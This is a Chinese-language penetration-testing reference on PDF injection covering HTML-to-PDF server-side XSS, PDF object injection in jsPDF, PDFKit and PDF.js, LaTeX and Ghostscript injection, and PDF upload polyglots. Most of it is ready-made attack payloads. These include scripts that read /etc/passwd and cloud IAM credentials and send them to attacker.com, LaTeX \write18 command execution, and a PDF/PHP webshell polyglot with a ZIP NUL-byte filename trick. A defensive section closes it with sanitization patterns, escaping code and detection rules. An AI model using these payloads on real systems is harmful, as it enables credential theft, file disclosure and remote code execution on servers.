---
attack_surface: [文件类, 注入类, 客户端利用, 信息泄露, 供应链/依赖]
impact: [信息泄露, 机密性破坏, 远程代码执行, 完整性破坏, 身份伪造]
risk_level: 高
prerequisites:
  - XSS 基础（HTML/CSS/JavaScript 注入原理）
  - Headless Browser / PDF 渲染引擎概念
  - SSRF 基础（攻击链条场景）
  - HTTP 协议基础
related_techniques:
  - xss
  - ssrf
  - csti-client-side-template-injection
  - file-upload
  - formula-injection
  - latex-injection
  - ghostscript-injection
difficulty: 中级
tools:
  - Burp Suite + Burp Collaborator
  - Puppeteer / Chromium
  - qpdf / pdfid.py / pdf-parser.py
  - curl
---

# PDF Injection — PDF 注入攻击全矩阵
> 关联文档：[XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [File Upload](../File%20Upload/README.md) · [Formula Injection](../Formula%20Injection/README.md) · [Server Side XSS (Dynamic PDF)](../Server%20Side%20XSS%20(Dynamic%20PDF)/README.md)

---

# 0x01 背景与原理

## 1.0 TL;DR

PDF Injection 是一类**利用 PDF 生成/渲染流程中用户可控输入**实现代码执行、文件读取或信息窃取的攻击技术总称。攻击面跨越三个层次：

1. **HTML → PDF 转换层**：用户提交的 HTML 被 wkhtmltopdf / Puppeteer / Playwright 等服务端引擎渲染为 PDF，恶意 JS 在**服务端浏览器上下文**中执行
2. **PDF 对象注入层**：用户输入直接拼入 PDF 原生语法字符串，通过闭合括号注入 `/OpenAction`、`/AA` 等 PDF 对象实现任意 JS 执行或 SSRF
3. **PDF 处理链注入层**：LaTeX → PDF 编译、Ghostscript 后处理、PDF.js 客户端渲染——每个处理环节都可能引入独立的注入面

## 1.1 什么是 PDF Injection

传统 PDF 安全讨论通常聚焦于 PDF 文件作为**静态文档**的攻击面（恶意 PDF 钓鱼、PDF Reader 漏洞）。PDF Injection 关注的是相反的方向：攻击者通过**控制 PDF 的生成/渲染输入**来攻击**处理 PDF 的那一方**（服务器或客户端 PDF 阅读器）。

```
传统恶意 PDF:
  攻击者制作恶意 PDF → 受害者用 Acrobat 打开 → 触发 Reader 漏洞

PDF Injection:
  攻击者提交恶意输入 → 服务器将其渲染为 PDF → 攻击服务器的渲染引擎
  攻击者提交恶意输入 → 客户端 PDF.js 渲染 → 攻击客户端浏览器
```

## 1.2 攻击面分类

```
┌──────────────────────────────────────────────────────────────────┐
│                    PDF Injection 攻击面                            │
├──────────────────────────────────────────────────────────────────┤
│  Layer 1: HTML → PDF 转换                                         │
│    wkhtmltopdf / Puppeteer / Playwright / Prince / iText          │
│    输入: HTML/CSS/JS → 输出: PDF                                  │
│    危害: 服务端 JS 执行 → LFI / SSRF / 云 metadata 窃取 / RCE      │
├──────────────────────────────────────────────────────────────────┤
│  Layer 2: PDF 对象注入                                            │
│    用户字符串直接拼入 PDF 语法 → 闭合括号 → 注入 PDF 操作符          │
│    入口: PDF 生成库 (jsPDF/PDFKit/PDF-Lib) 的字符串参数             │
│    危害: 生成的 PDF 中嵌入恶意 JS / 开放重定向 / SSRF               │
├──────────────────────────────────────────────────────────────────┤
│  Layer 3: PDF 处理链                                              │
│    LaTeX → PDF 编译注入 | Ghostscript 后处理 | PDF.js 客户端渲染    │
│    输入: .tex 源码 / PostScript / PDF 文件本身                     │
│    危害: RCE (write18) / 沙箱绕过 / 客户端 XSS                     │
├──────────────────────────────────────────────────────────────────┤
│  Layer 4: PDF 作为上传载体                                        │
│    PDF polyglot | magic 欺骗 | PDF XXE | PDF CORS                 │
│    危害: 绕过文件类型过滤 / SSRF / 信息泄露                         │
└──────────────────────────────────────────────────────────────────┘
```

## 1.3 与客户端 XSS 的本质区别

Server Side XSS（Layer 1 的核心）与客户端 XSS 的执行上下文完全不同：

| 维度 | 客户端 XSS | Server Side XSS |
|------|-----------|-----------------|
| **执行环境** | 受害者浏览器 | 服务端浏览器引擎 |
| **同源策略** | 受限于页面 origin | 无 origin 限制（`file://` 路径） |
| **危害范围** | 当前用户会话 | 服务器文件系统、内网、云 metadata |
| **CSP 有效性** | 可限制 | 通常未配置或无效 |
| **触发方式** | 用户访问恶意链接/页面 | 用户提交内容后服务端自动渲染 |
| **OOB 验证** | XSSHunter / Burp Collaborator | 同样适用（HTTP/DNS 回调） |

---

# 0x02 服务端 PDF 生成注入

## 2.1 PDF 生成引擎风险矩阵

用户提交 HTML 内容（发票、报告、简历），服务端将其渲染为 PDF——这是最常见的 Server Side XSS 入口。

| 引擎 | 底层浏览器 | 已知风险 | 关键标志 |
|------|-----------|---------|---------|
| **wkhtmltopdf** | QtWebKit (旧版 WebKit) | JS 执行 + 默认启用本地文件访问 | `--enable-local-file-access` 默认开启 |
| **Puppeteer** | Chromium | 完整 Chrome JS 引擎 + DevTools 协议 | 通过 `page.pdf()` 生成 |
| **Playwright** | Chromium / Firefox / WebKit | 同 Puppeteer | 多浏览器支持 |
| **Prince XML** | 自研引擎 | JS 支持有限但存在 PDF object 注入 | 商业软件 |
| **TCPDF** | PHP 原生（无浏览器） | 不支持 JS，但存在 HTML/SVG → PDF 路径遍历 | PHP 生态主流 |
| **PDFKit** | Node.js 原生 | 有限 JS 支持 | Node.js 生态 |
| **iText / FPDF** | Java/PHP 原生 | PDF object 注入 | 企业 Java 生态 |

### 2.1.1 wkhtmltopdf 特殊风险

`wkhtmltopdf` 默认启用以下危险选项：

```bash
# 默认行为等价于
wkhtmltopdf --enable-local-file-access --enable-javascript input.html output.pdf
```

这意味着 `<script>` 标签不仅会执行，还能通过 `XMLHttpRequest` 读取 `file:///etc/passwd`。

### 2.1.2 Puppeteer/Playwright 生成模式

```javascript
// 常见不安全的 PDF 生成代码
const browser = await puppeteer.launch({ args: ['--no-sandbox'] });
const page = await browser.newPage();
await page.setContent(userInputHTML);  // ← 用户可控 HTML
await page.pdf({ path: 'output.pdf' });
```

## 2.2 Headless Browser 服务

### 截图服务

用户输入 URL 或 HTML，服务端用 headless 浏览器截图：

```bash
# 典型实现
puppeteer.screenshot({ url: userInput })    # ← 用户可控 URL
puppeteer.setContent(userHTML).screenshot() # ← 用户可控 HTML
```

触发点：社交媒体预览生成、网站缩略图服务、URL 健康检查 bot。

### SEO / 社交预览渲染

Googlebot、Twitterbot、Slackbot 等服务端抓取页面时执行 JS 生成预览卡片。在内部 SEO 预渲染服务中，攻击者控制的页面可能访问内网资源。

### 最小化探测

提交包含 OOB 回调的 HTML 片段即可判断是否存在 headless 渲染：

```html
<img src="http://your-collaborator.net/ping">
```

任何对 `your-collaborator.net` 的请求都证明服务端检索了 HTML 并尝试渲染。

## 2.3 服务端渲染框架 (SSR)

Next.js、Nuxt、Angular Universal 等框架在服务端预渲染页面时，`dangerouslySetInnerHTML` / `v-html` 在服务端同样危险：

```jsx
// Next.js SSR 不安全示例
export async function getServerSideProps(context) {
  const userContent = context.query.content;  // ← 用户可控
  return { props: { content: userContent } };
}

function Page({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />; // ← Server Side XSS
}
```

Node.js 服务端可访问 `process.env`、文件系统模块——如果 SSR payload 能触发服务端代码执行，影响远超 XSS。

## 2.4 指纹识别与探测

### 2.4.1 服务端浏览器引擎识别

```html
<!-- 探测 JS 引擎类型 -->
<script>
document.write(navigator.userAgent);           // 直接输出 UA
document.write(JSON.stringify(window.navigator)); // 完整 navigator 对象
</script>

<!-- 探测可用 API (Chromium vs QtWebKit) -->
<img src="x" onerror="
  var features = [];
  if (typeof window.chrome !== 'undefined') features.push('Chromium');
  if (typeof window.navigator.qt !== 'undefined') features.push('QtWebKit');
  if (window.callPhantom) features.push('PhantomJS');
  new Image().src = 'http://attacker.com/fp?' + features.join(',');
">
```

### 2.4.2 三阶段 OOB 确认流程

```
测试流程:
  1. 注入 <img src="http://collaborator.net/ping">
     收到 HTTP 请求 → 确认 HTML 被检索
  2. 注入 <img src=x onerror="fetch('http://collaborator.net/js_ok')">
     确认 JS 执行 → Server Side XSS 成立
  3. 注入 file:///etc/passwd 读取 payload
```

```html
<!-- 阶段 1: 基础可达性探测 — 最轻量 -->
<img src="http://attacker.com/ping">

<!-- 阶段 2: 确认 JS 执行 -->
<img src="x" onerror="document.write('test')">
<script>document.write(JSON.stringify(window.location))</script>

<!-- 阶段 3: 确认文件系统访问能力 -->
<img src="x" onerror="document.write(window.location)">
<script>document.write(window.location)</script>
<!-- 如果返回 file:// 路径 → 文件系统可达 -->

<!-- 外置脚本加载确认 -->
<script src="http://attacker.com/test.js"></script>
```

---

# 0x03 HTML → PDF Payload 技术库

## 3.1 信息泄露 — 路径暴露

```html
<img src="x" onerror="document.write(window.location)">
<script> document.write(window.location) </script>
```

## 3.2 本地文件读取 (LFI)

```html
<!-- XMLHttpRequest 读取 -->
<script>
x = new XMLHttpRequest;
x.onload = function() { document.write(btoa(this.responseText)) };
x.open("GET", "file:///etc/passwd");
x.send();
</script>

<!-- iframe 嵌入 -->
<iframe src="file:///etc/passwd"></iframe>
<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')">

<!-- object/embed 标签 -->
<object data="file:///etc/passwd">
<embed src="file:///etc/passwd" width="400" height="400">

<!-- meta 刷新 -->
<meta http-equiv="refresh" content="0;url=file:///etc/passwd">
```

### 3.2.1 SVG 文件读取（路径遍历）

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="500">
  <g>
    <foreignObject width="800" height="500">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <iframe src="file:///etc/passwd" width="800" height="500"></iframe>
        <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
      </body>
    </foreignObject>
  </g>
</svg>
```

### 3.2.2 敏感文件目标

```
file:///proc/self/environ          # 环境变量（含 API Key）
file:///proc/self/cwd/.env         # Node.js/Python .env
file:///root/.bash_history         # 命令历史
file:///var/run/docker.sock        # Docker socket（可能实现 RCE）
```

## 3.3 云 Metadata 窃取

```html
<script>
fetch('http://169.254.169.254/latest/meta-data/')
  .then(r => r.text())
  .then(d => {
    new Image().src = 'http://attacker.com/exfil?data=' + btoa(d);
  });
</script>
```

## 3.4 PD4ML 附件提取

`PD4ML` 是 Java HTML-to-PDF 库，支持 `<pd4ml:attachment>` 标签：

```html
<html>
  <pd4ml:attachment
    src="/etc/passwd"
    description="attachment sample"
    icon="Paperclip" />
</html>
```

生成的 PDF 将包含 `/etc/passwd` 作为附件，在支持附件的 PDF 阅读器中可直接提取。

## 3.5 端口扫描

```html
<script>
const checkPort = (port) => {
    fetch(`http://127.0.0.1:${port}`, { mode: "no-cors" }).then(() => {
        new Image().src = `http://attacker.com/ping?port=${port}`;
    });
};
for (let i = 0; i < 1000; i++) {
    checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```

## 3.6 Bot 延迟检测

```html
<script>
let time = 500;
setInterval(() => {
    new Image().src = `https://attacker.com/ping?time=${time}ms`;
    time += 500;
}, 500);
</script>
```

通过 ping 间隔确定 bot 活跃时长——决定 payload 需要多快执行完。

## 3.7 SSRF 载荷

```html
<!-- 基础 SSRF -->
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(d => { new Image().src = 'http://attacker.com/?d=' + btoa(d); });
</script>

<!-- base 标签劫持 -->
<base href="http://attacker.com">

<!-- meta 标签 SSRF -->
<meta http-equiv="refresh" content="0; url=http://169.254.169.254/">

<!-- link 标签 -->
<link rel="stylesheet" href="http://attacker.com/exfil">

<!-- 多媒体标签 -->
<video src="http://attacker.com"></video>
<audio src="http://attacker.com"></audio>
<source src="http://attacker.com">
```

---

# 0x04 PDF Object Injection — 原生 PDF 语法注入

## 4.1 注入原理

当用户输入被**直接嵌入 PDF 文件内容**（非 HTML → PDF 转换）时，如果输入中的 `(` `)` `\` 三个字符未被转义，攻击者可通过闭合括号注入新的 PDF 对象操作符。

```
输入点 → PDF 字符串中未转义的 ( ) \
  → 字典闭合 + 注入新 PDF 对象
  → /OpenAction /JS 执行
```

```pdf
# 注入点示例：用户输入 reflected 到 PDF string
# 若输入 ) 可闭合括号，则：
) /A << /S /JavaScript /JS (app.alert(1)) >> (
```

## 4.2 注入原语速查

| 目标 | Payload | 适用场景 |
|------|---------|----------|
| 打开时执行 JS | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Acrobat/Reader |
| 点击时执行 JS | `/A << /S /JavaScript /JS (app.alert(1)) >>` | 控制 link annotation |
| 附加动作 | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | 鼠标进入/获取焦点 |
| 盲回调 | `/A << /S /URI /URI (https://attacker.tld/) >>` | OOB 可达性验证 |
| 内容窃取 | `for (...) this.getPageNthWord(...)` | PDF 内容逐词泄露 |
| 表单提交 | Widget + `this.submitForm(...)` | 比 `/URI` 更强 |

## 4.3 Widget/AcroForm 升级

```pdf
#)>> << /Type /Annot /Rect [0 0 900 900] /Subtype /Widget
/Parent << /FT /Btn /T(a) >>
/A << /S /JavaScript /JS (app.alert(1)) >>
```

## 4.4 无交互自动执行

利用 `/AA` 字典中的触发器实现页面加载时自动执行 JS，无需用户点击：

```javascript
// Screen annotation — 页面可见时自动触发
const doc = new jsPDF();
doc.createAnnotation({
  bounds: {x: 0, y: 10, w: 200, h: 200},
  type: 'link',
  url: `/)>> >>
    <</Subtype /Screen /Rect [0 0 900 900] /AA <</PV
    <</S/JavaScript/JS(app.alert(1))>>/(`  // ← PV = Page Visible, 自动执行
});
```

`/AA` 字典支持的触发器：

| 触发器 | 全称 | 触发条件 |
|--------|------|---------|
| `/PV` | Page Visible | 页面变为可见时 |
| `/PI` | Page Invisible | 页面变为不可见时 |
| `/PO` | Page Open | 页面被打开时 |
| `/PC` | Page Close | 页面被关闭时 |
| `/E` | Enter | 鼠标进入注释区域 |
| `/X` | Exit | 鼠标离开注释区域 |

其中 `/PV` 和 `/PO` 在页面加载时自动触发，无需任何用户交互。

## 4.5 PDF 结构分析工具

```bash
# 结构化输出 PDF 内容
qpdf --qdf --object-streams=disable victim.pdf readable.pdf

# 快速关键字扫描
pdfid.py readable.pdf
pdf-parser.py -search "/JS" -search "/AA" -search "/OpenAction" readable.pdf

# grep 快速定位
rg -n '/URI|/JS|/AA|/OpenAction|/Subtype /Link|/Subtype /Widget' readable.pdf
```

---

# 0x05 PDF 生成库注入

## 5.1 根本原因

PortSwigger 总结了这类漏洞的共同根因：**PDF 生成库在将用户输入写入 PDF 字符串时，未对 `(` `)` `\` 三个字符做转义**。PDF 字符串以 `(` 开头 `)` 结尾，输入中的 `)` 可提前闭合字符串，后续内容被解析为 PDF 操作符。

受影响的库包括 jsPDF、PDFKit、PDF-Lib——它们的 `addJS()`、`createAnnotation()`、`PDFString.of()` 等方法直接将用户输入拼入 PDF 对象，而不做任何转义。

## 5.2 PDF.js FontMatrix 注入 (CVE-2024-4367)

**影响范围：** Firefox < 126、Firefox ESR < 115.11、Thunderbird < 115.11、pdfjs-dist <= 4.1.392。同时影响所有内嵌 PDF.js 的应用——包括 Electron 桌面应用和 `react-pdf` 等 React 组件库。

**精确版本表：**

| 版本 | 状态 | 原因 |
|------|------|------|
| v0.8.1181 (2014-04) | 受影响 | 首个公开发布版 |
| v1.4.20 (2016-01) | 受影响 | — |
| v1.5.188 (2016-04) | **不受影响** | 一个意外 typo 导致 `isEvalSupported` 失效路径被跳过 |
| v1.9.426 (2017-08) | 不受影响 | 在下一受影响版本之前 |
| v1.10.88 (2017-10) | 受影响 | typo 修复重新引入了漏洞代码路径 |
| v4.1.392 (2024-04) | 受影响 | 修复前的最后一个版本 |
| v4.2.67 (2024-04-29) | **不受影响** | 已修复 |

**根因代码路径：**

```
FontMatrix 数组 → extractFontHeader() 读取 → translateFont() 传递
  → compileGlyph() 调用 fontMatrix.slice()
  → compileGlyphImpl() 将 slice 结果拼入 JS 命令字符串
  → new Function("c", "size", jsBuf.join("")) 执行
```

关键代码在 `compileGlyph()` 中：

```javascript
const cmds = [
  { cmd: "save" },
  { cmd: "transform", args: fontMatrix.slice() },  // ← slice() 返回原始值
  { cmd: "scale", args: ["size", "-size"] },
];
this.compileGlyphImpl(code, cmds, glyphId);
```

`fontMatrix.slice()` 返回的数组直接作为 `c.transform()` 的参数——如果数组元素包含字符串 `(0\); alert('foobar')`，则生成的 JS 代码为 `c.transform(1,2,3,4,5,0\); alert('foobar'));`，闭合括号后注入任意 JS。

**Payload：**

```pdf
/FontMatrix [1 2 3 4 5 (0\); alert('foobar')]
```

**缓解措施：**

1. 升级 pdfjs-dist 至 >= v4.2.67
2. 设置 `isEvalSupported = false` 禁用 `new Function` 代码路径（CSP 禁止 `unsafe-eval` 时同样生效）
3. Electron 应用需检查 `node_modules` 中间接依赖的 pdf.js 版本——`react-pdf` 等组件库曾捆绑受影响版本

## 5.3 jsPDF addJS() 注入 (CVE-2026-25755)

```javascript
// JavaScript PDF 生成库 jsPDF 中
// addJS() 方法对用户输入未转义
const doc = new jsPDF();
doc.addJS("console.log('x');) >> /AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>");
// 注入的 PDF object 通过 addJS 写入
```

## 5.4 jsPDF createAnnotation() 注入

`addJS()` 不是 jsPDF 唯一的注入面。`createAnnotation()` 的 `url` 参数同样将用户输入**直接写入 PDF 对象字符串**而不转义括号和反斜线：

```javascript
// jsPDF createAnnotation — url 参数可注入
const doc = new jsPDF();
doc.createAnnotation({
  bounds: {x: 0, y: 10, w: 200, h: 200},
  type: 'link',
  url: `/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`
});
```

## 5.5 PDFKit / PDF-Lib 的 PDFString 注入

PDFKit 和 PDF-Lib 使用 `PDFString.of()` 构造 PDF 字符串对象。如果用户输入未经转义传入：

```javascript
// PDFKit — link annotation 中的 PDFString.of()
const linkAnnotation = pdfDoc.context.obj({
  Type: 'Annot',
  Subtype: 'Link',
  A: {
    Type: 'Action',
    S: 'URI',
    URI: PDFString.of(`/input`),  // ← 用户输入直接进入 PDF 字符串
  }
});

// PDF-Lib 同模式
A: {
  Type: 'Action',
  S: 'URI',
  URI: PDFString.of(`injection)`),  // ← 闭合括号后注入 PDF 对象
}
```

---

# 0x06 LaTeX → PDF 注入

## 6.1 场景与配置风险

Web 应用将用户输入的 LaTeX 代码渲染为 PDF（常见于简历生成、学术工具、数学公式渲染服务）。底层调用 `pdflatex` 或 `xelatex` 编译 `.tex` 文件。

编译配置决定风险等级：

| 配置 | 风险 |
|------|------|
| `--no-shell-escape` | 最安全，禁用 `\write18` |
| `--shell-restricted` | 仅允许预设的"安全"命令（如 `mpost`） |
| `--shell-escape` | 允许执行任意系统命令（极度危险） |

## 6.2 文件操作

**读取文件：**

```latex
\input{/etc/passwd}
\include{password}          % load .tex file
\lstinputlisting{/etc/passwd}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

**读取单行文件：**

```latex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

**多行读取循环：**

```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```

**写入文件：**

```latex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```

## 6.3 命令执行 (RCE)

**直接执行：**

```latex
\immediate\write18{env > output}
\input{output}
```

**mpost 命令绕过（shell-restricted 模式下仍可执行）：**

```latex
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}
```

**受限模式下的其他可用命令探测：**

```latex
\input{|"bibtex8 --version > /tmp/b.tex"}
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```

**Base64 规避内容过滤：**

```latex
\immediate\write18{env | base64 > test.tex}
\input{test.tex}
```

**LaTeX 中的 XSS（PDF 内嵌链接）：**

```latex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

---

# 0x07 Ghostscript PDF 处理注入

## 7.1 攻击面

Ghostscript 是 ImageMagick 和其他图像/文档处理工具链中的 PostScript/PDF 解释器。当服务端使用 ImageMagick 处理上传的 PDF 文件（缩略图生成、格式转换、OCR 预处理）时，Ghostscript 的沙箱绕过漏洞可导致 RCE。

关键攻击路径：

```
上传恶意 PDF → ImageMagick 调用 Ghostscript 解析 → 
  利用 Ghostscript 路径解析漏洞绕过 -dSAFER 沙箱 → 任意命令执行
```

## 7.2 典型 CVE

关注 2023 年后的 Ghostscript 路径解析漏洞（如 CVE-2023-36664）。

> **详见**：[ghostscript-overview](https://blog.redteam-pentesting.de/2023/ghostscript-overview/) — RedTeam Pentesting 对 Ghostscript 沙箱绕过机制的详细分析。

---

# 0x08 PDF 在文件上传攻击中的角色

## 8.1 PDF Polyglot 构造

PDF 格式宽松的头部解析特性使其成为 polyglot 构造的理想容器——前端几个字节的 `%PDF-1.3` 即可通过 MIME 验证，而文件剩余部分可以嵌入任意 payload。

```bash
# 构造一个同时是有效 PDF 和有效 PHP webshell 的 polyglot
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system(\$_REQUEST[\"cmd\"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf
```

## 8.2 ZIP NUL-byte 文件名走私

PHP 的 `ZipArchive` 将文件名视为 C-string（在第一个 NUL 处截断），而文件系统写入完整名称（丢弃 NUL 后的内容）。结合 PDF polyglot：

```bash
# 1. 从 PDF polyglot 开始
cp embedded.pdf shell.php..pdf

# 2. 压缩
zip null.zip shell.php..pdf

# 3. 用 hex editor 将 .php 后第一个 . 替换为 0x00
#    文件名变为: shell.php\x00.pdf
#    ZipArchive 验证看到 "shell.php .pdf" → 允许
#    提取器写入 "shell.php" → RCE
```

> **注意**：payload 文件仍必须通过服务端 magic/MIME sniffing。将 PHP 嵌入 PDF 流中可保持 header 有效。适用于验证路径与提取路径在字符串处理上存在不一致的场景。

## 8.3 PDF Magic 欺骗上传

利用不同库对 magic bytes 的宽松判定上传任意内容：

| 库 | 行为 | 利用方式 |
|----|------|---------|
| **mmmagic** | `%PDF` 出现在前 1024 字节内即视为 PDF | 在 JSON 前 1KB 内插入 `%PDF` 魔数 |
| **pdflib** | 在 JSON 字段内嵌入假 PDF 结构 | 字段值 `{"data": "%PDF-1.3 fake pdf body..."}` |
| **file** binary | 读取前 1MB 判断类型 | 构造 >1MB JSON 使其无法解析为 JSON，内嵌真实 PDF 头 |

## 8.4 PDF XXE / CORS 攻击

上传 PDF-Adobe 格式文件可触发 XXE 和 CORS 攻击：

- **PDF XXE**：Adobe PDF 格式支持 XML 外部实体引用，可用于 SSRF
- **PDF CORS**：恶意 PDF 通过跨域请求窃取敏感数据

详见 [PDF-Adobe-XXE&CORS 技巧](https://book.hacktricks.xyz/pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass)。

## 8.5 上传后 PDF → XSS

如果上传的 PDF 在浏览器中被 PDF.js 等服务端渲染库打开，可利用 0x05 中的 PDF Object Injection 技术在 PDF 中嵌入 JS 实现 XSS。详见 [PDF Injection](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/pdf-injection)。

---

# 0x09 攻击链建模

## 9.1 完整攻击链模型

```
[外部攻击者]
    │
    ▼
[Web 应用] ──用户可控 HTML 输入──→ [PDF/截图/渲染服务]
    │                                    │
    │                              ┌─────┴──────┐
    │                              │ JS 执行:    │
    │                              │ · file://   │ ← LFI
    │                              │ · localhost  │ ← 内网扫描
    │                              │ · 169.254    │ ← 云 metadata
    │                              │ · DNS/HTTP   │ ← OOB 数据窃取
    │                              └──────────────┘
    ▼
[攻击者 Collaborator] ←── 窃取的数据
```

## 9.2 SSRF 触发内部渲染服务

许多组织中，PDF 生成/截图服务部署在内网作为微服务：

```
Nginx → App Server → http://pdf-service.internal:3000/render?html=...
                              ↑ SSRF 可达的目标
```

如果攻击者通过 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) 发现 `pdf-service.internal:3000`，可向其投喂恶意 HTML，触发 Server Side XSS → 从内部读取云 metadata。

## 9.3 RCE 路径汇总

| 路径 | 条件 | 技术 |
|------|------|------|
| wkhtmltopdf `--enable-local-file-access` + JS | 默认配置 | `file://` 读 + 外部 exfil |
| Puppeteer `--no-sandbox` | Docker/K8s 部署 | Node.js `require` 逃逸 |
| PDF.js CVE-2024-4367 | pdfjs-dist < 4.2.67 | FontMatrix `c.transform` 通过 `new Function` 执行 |
| ReportLab CVE-2023-33733 | 未更新版本 | 三重括号 `{{{ }}}` 表达式求值 |
| PhantomJS (已废弃) | 遗留系统 | `require('child_process').exec()` |
| LaTeX `--shell-escape` | 开启 shell-escape | `\write18{cmd}` 任意命令执行 |
| LaTeX `--shell-restricted` + mpost | 允许 mpost | `mpost -ini "-tex=bash -c ..."` RCE |

## 9.4 文件上传 → PDF Polyglot → RCE 攻击链

```
攻击者上传 PDF polyglot (PDF + PHP) 
  → 服务端 MIME 验证通过（魔数 %PDF）
  → 利用 ZIP NUL-byte 或路径遍历放置 webshell
  → 访问 webshell URL
  → RCE
```

---

# 0x0A 检测与防御

## 10.1 浏览器沙箱化

```bash
# wkhtmltopdf — 禁用危险特性
wkhtmltopdf --disable-local-file-access \
            --disable-javascript \
            --no-stop-slow-scripts \
            input.html output.pdf
```

关键 Puppeteer 安全配置：

```javascript
// 推荐的安全启动配置
const browser = await puppeteer.launch({
    args: ['--disable-web-security=false'], // 保持 web 安全
    ignoreDefaultArgs: ['--disable-web-security'], // 禁止覆盖
});

const page = await browser.newPage();
await page.setRequestInterception(true);
page.on('request', (req) => {
    const url = req.url();
    // 阻止 file:// 和内部 IP 访问
    if (url.startsWith('file://') ||
        url.match(/^https?:\/\/(127\.|10\.|172\.1[6-9]|172\.2\d|172\.3[01]|192\.168|169\.254)/)) {
        req.abort();
    } else {
        req.continue();
    }
});
```

## 10.2 网络层隔离

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐
│  公网 App    │────→│  渲染微服务    │────→│  Collaborator│
│             │     │  (独立 VPC)   │  ✗  │  file://     │
│             │     │  (无外网出口)  │  ✗  │  localhost   │
└─────────────┘     └──────────────┘  ✗  │  169.254     │
                                         └─────────────┘
```

- 渲染服务放在独立网络段，无外网出口（阻止 OOB 数据窃取）
- 静态 iptables/nftables 规则阻止 `file://` 协议和 metadata IP 的出站请求
- 渲染服务不应有访问内网敏感服务的网络权限

## 10.3 输入过滤与输出编码

```python
# 在 HTML 内容进入渲染引擎前过滤
import re

DANGEROUS_PATTERNS = [
    r'file://',                          # 本地文件读取
    r'169\.254\.169\.254',               # 云 metadata
    r'<script[^>]*>',                    # Script 标签
    r'onerror\s*=',                      # 事件处理器
    r'onload\s*=',
    r'<iframe[^>]*>',
    r'<embed[^>]*>',
    r'<object[^>]*>',
    r'<meta[^>]*http-equiv',
]

def sanitize_html_content(html):
    for pattern in DANGEROUS_PATTERNS:
        html = re.sub(pattern, '', html, flags=re.IGNORECASE)
    return html
```

> `re.sub` 黑名单过滤只是第一层防线。更安全的做法是使用 HTML 净化库（DOMPurify on server side、OWASP Java HTML Sanitizer）并配合严格的 CSP。

**PDF 字符串输出编码（针对 0x04/0x05 根因）：**

```javascript
// PDF 生成库必须对用户输入中的这三个字符做转义
function escapePDFString(input) {
    return input.replace(/\\/g, '\\\\')   // 反斜线
                .replace(/\(/g, '\\(')    // 左括号
                .replace(/\)/g, '\\)');   // 右括号
}
```

## 10.4 运行时检测规则

| 检测层 | 规则 |
|--------|------|
| **静态审计** | 搜索代码中 `page.setContent()` / `page.pdf()` / `wkhtmltopdf` / `write18` 调用，检查用户输入是否直接传入 |
| **流量分析** | 监控渲染服务向外部 IP 的 HTTP/DNS 请求（正常渲染不应产生） |
| **文件访问** | `auditd` 监控渲染进程对 `/etc/`、`/proc/` 的读取操作 |
| **PDF 结构** | 解析生成 PDF 的 `/JS`、`/OpenAction`、`/AA` 对象——这些不应出现在数据驱动的 PDF 中 |
| **进程行为** | 渲染进程不应 fork 子进程或加载非渲染相关 `.so` 文件 |
| **LaTeX 编译** | 永远使用 `--no-shell-escape` 编译用户提供的 `.tex` 文件；如需 mpost 则用 `--shell-restricted` 并审计允许列表 |

## 10.5 纵深防御检查清单

- [ ] HTML → PDF 引擎中 JS 执行已禁用或沙箱化
- [ ] PDF 生成库对用户输入中的 `(` `)` `\` 做了转义
- [ ] 渲染服务无外网访问能力（阻止 OOB）
- [ ] 渲染服务无内网敏感资源访问权限
- [ ] `file://` 协议在渲染引擎中已禁用
- [ ] LaTeX 编译使用 `--no-shell-escape`
- [ ] Ghostscript 调用使用 `-dSAFER` 且版本已更新
- [ ] 上传 PDF 的结构经过解析过滤（检查 `/JS`、`/OpenAction`、`/AA`）
- [ ] 文件上传的 MIME 检测不只是魔数前几个字节

---

## 参考资料

- [HackTricks — Server Side XSS (Dynamic PDF)](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html)
- [HackTricks — PDF Injection](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/pdf-injection.html)
- [Gareth Heyes, "Portable Data exFiltration: XSS for PDFs" — PortSwigger Research](https://portswigger.net/research/portable-data-exfiltration)
- [Thomas Rinsma, "CVE-2024-4367 — Arbitrary JavaScript execution in PDF.js"](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/)
- [buer.haus — Escalating XSS in PhantomJS Image Rendering to SSRF/Local File Read](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
